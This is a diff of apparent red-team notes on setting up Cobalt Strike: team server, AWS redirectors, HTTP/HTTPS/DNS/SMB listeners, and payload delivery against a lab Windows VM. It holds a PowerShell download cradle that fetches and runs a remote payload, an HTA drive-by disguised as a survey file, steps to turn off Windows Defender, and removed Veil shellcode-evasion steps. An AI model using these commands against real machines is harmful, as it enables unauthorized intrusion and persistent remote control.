@@ -4,50 +4,52 @@ Cobalt Strike
 Use the following install location: /opt/cobaltstrike/
      This will allow you to get third-party apps installed when running /opt/discover/update.sh
 
-Update
-    cd /opt/cobaltstrike/
-    ./update
+- Update
+cd /opt/cobaltstrike/
+./update
 
-Remove old data and Beacons (optional)
-    Stop the team server
-    rm -rf data/
+- Remove old data and Beacons (optional)
+Stop the team server
+rm -rf data/
 
-Start the team server
-    There are 2 mandatory parameters and 2 optional parameters. The first 2 parameters are required.
-    ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
+- Start the team server
+Start a screen or tmux session.
 
-    ./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2021-12-31
+Parameters wrapped in [ ] are mandatory, those in < > are optional
+./teamserver [IP] [password] <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>
 
-    When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
+./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2021-12-31
+
+When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Connecting to the team server
 
 - Locally
-    Right-click in the Terminal > Split Terminal Horizontally
-    cd /opt/cobaltstrike/
-    ./cobaltstrike
-    Host: 127.0.0.1
-    Port: 50050
-    User: <your name>
-    Password: <password you entered from above>
-    Connect
-    Verify Fingerprint (SHA256 hash from above) > Yes
+Right-click in the Terminal > Split Terminal Horizontally
+cd /opt/cobaltstrike/
+./cobaltstrike
+Host: 127.0.0.1
+Port: 50050
+User: <your name>
+Password: <password you entered from above>
+Connect
+Verify Fingerprint (SHA256 hash from above) > Yes
 
 - Remote connection
-    OPSEC: Never allow a client to make direct connections to your team server. Always use SSH and locally forward the connection.
-    ssh user@teamserver -L 50050:127.0.0.1:50050
-    Follow the steps from above.
+OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
+ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
+Follow the steps from above.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Redirectors
 
 OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
 
-Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
-    Redirector1 - HTTP
-    Redirector2 - HTTPS
-    Redirector3 - DNS
+- Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
+Redirector1 - HTTP
+Redirector2 - HTTPS
+Redirector3 - DNS
 
 Install socat on each instance: sudo apt install socat
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -74,119 +76,111 @@ Cobalt Strike expects to find the Java Keystore file in the same folder as your 
 # Create listeners
 
 Cobalt Strike > Listeners > Add
-Name: HTTP
+Name: http
 Payload: Beacon HTTP
-HTTP Hosts: click + <Redirector1 IP>
-HTTP Host (Stager): <Redirector1 IP>
-HTTP Port (C2): 80
-OK > Save > OK
+HTTP Hosts: click + <Redirector1 IP> > OK
+Save > OK
 
 Add
-Name: HTTPS
+Name: https
 Payload: Beacon HTTPS
 HTTPS Hosts: click + <Redirector2 IP>
-HTTPS Host (Stager): <Redirector2 IP>
-HTTPS Port (C2): 443
-OK > Save > OK
+Save > OK
 
 Add
-Name: DNS
+Name: dns
 Payload: Beacon DNS
 DNS Hosts: click + <Redirector3 IP>
-OK > Save > OK
+Save > OK
+
+Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
+This is needed when a target you compromised cannot reach your Team Server directly over HTTP.
 
 Add
-Name: SMB
+Name: smb
 Payload: Beacon SMB
 Save > OK
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Launch an attack to gain a foothold.
 
-OPSEC: Staged payloads are typically less secure.
-    Always prefer a fully staged or stageless payload and disable payload staging.
-    When you see (S) in the framework, it refers to a stageless payload.
+OPSEC: Staged payloads tend to have more indicators compared to stageless.
+Always prefer a fully staged or stageless payload and disable payload staging.
+When you see (S) in the framework, it refers to a stageless payload.
 
-Disable Windows Defender on your target Windows VM.
-    Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
-    Standard: Windows Defender settings > turn off Real-time protection
+- Disable Windows Defender on your target Windows VM.
+Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
+Standard: Windows Defender settings > turn off Real-time protection
 
-Attack 1
-    Attacks > Packages > Payload Generator
-    Select the listener you just created > Choose
-    Output: Veil
-    Check Use x64 payload
-    Generate
-    Select the location for the payload > Save > OK
+- Generate a payload
+Attacks > Packages > Windows Executable (S)
+Select the listener you just created > Choose
+Output: Windows EXE
+Generate
+Select the location for the payload > Save > OK
 
-    cd /opt/Veil
-    ./Veil.py
-    use 1 (Evasion)
-    clean (remove any old artifacts)
-    list (look for payloads with shellcode_inject)
-    use 12 (cs/shellcode_inject/base64.py)
-    generate
-    4 - File with shellcode (\x41\x42..)
-    /root/payload.txt
+Transfer the payload to your target, execute, and you should receive a call back.
 
-    cd /var/lib/veil/output/compiled/payload.exe /tmp
-    Attacks > Web Drive-by > Host File
-    Browse to the file > Open
-    Local URI: /download/update.exe
-    Launch
-    Copy the contents > Ok
-    
-Attack 2
-    Attacks > Web Drive-by > Scripted Web Delivery (S)
-    URI Path: /a
-    Local Host: (same IP as your server)
-    Local Port: 80 (same port as your Listener)
-    Listener: Initial access > Choose
-    Type: powershell
-    Check Use x64 payload
-    Launch
+- Interact with Beacon
+Right-click on the Beacon > Interact
+help                                          List of available help commands
+help <command>                                Get more help on a particular command
+ctrl +/-                                      Increase or decrease the font size
+ctrl k                                        Clear the tab
 
-    Copy the download cradle provided > OK
-    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"
+By default, Beacon will check in every 60 seconds.
+sleep 0                                       Make Beacon interactive
+sleep 2                                       Make Beacon call home every 2 seconds
+sleep 30 10                                   Make Beacon call home every 30 seconds with a 10% jitter
 
-    Open a Command Prompt on your Windows VM and run the download cradle.
+Right-click on the X in the tab for additional options.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+- Attack 2
+Attacks > Web Drive-by > Scripted Web Delivery (S)
+URI Path: /a
+Local Host: (same IP as your server)
+Local Port: 80 (same port as your Listener)
+Listener: Initial access > Choose
+Type: powershell
+Launch
+
+Copy the download cradle provided > OK
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"
+
+Open a Command Prompt on your Windows VM and run the download cradle.
 
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Interact with the Beacon
-    Right-click on the Beacon > Interact
-    sleep 2                                       Have the Beacon check in once every 2 seconds
-    help
-    help <command>
+- Clean up
+exit
+Right click on the Beacon > Session > Remove
+Attacks > Web Drive-by > Manage
+Select each line > Kill
+Listeners > Restart > OK
 
-Clean up
-    exit
-    Right click on the Beacon > Session > Remove
-    Attacks > Web Drive-by > Manage
-    Select each line > Kill
-    Liteners > Restart > OK
+- Attack 3
+Attacks > Packages > HTML Application
+Listener: Initial access > Choose
+Method: Executable
+Generate
+/root/evil.hta
+Save > OK
 
-Attack 3
-    Attacks > Packages > HTML Application
-    Listener: Initial access > Choose
-    Method: Executable
-    Generate
-    /root/evil.hta
-    Save > OK
+Attacks > Web Drive-by > Host File
+File: /root/evil.hta > Open
+Local URI: /survey.txt
+Local Host: 192.168.1.5
+Local Port: 80
+Mime Type: automatic
+Launch > OK
 
-    Attacks > Web Drive-by > Host File
-    File: /root/evil.hta > Open
-    Local URI: /survey.txt
-    Local Host: 192.168.1.5
-    Local Port: 80
-    Mime Type: automatic
-    Launch > OK
+Copy the URI provided > OK
 
-    Copy the URI provided > OK
-
-    Open Internet Explorer on your Wibndows VM to http://192.168.1.5/survey.txt
-    Open > Allow
-    Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+Open Internet Explorer on your Wibndows VM to http://192.168.1.5/survey.txt
+Open > Allow
+Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 View > Web Log is helpful to know when HTTP requests are hitting your team server.
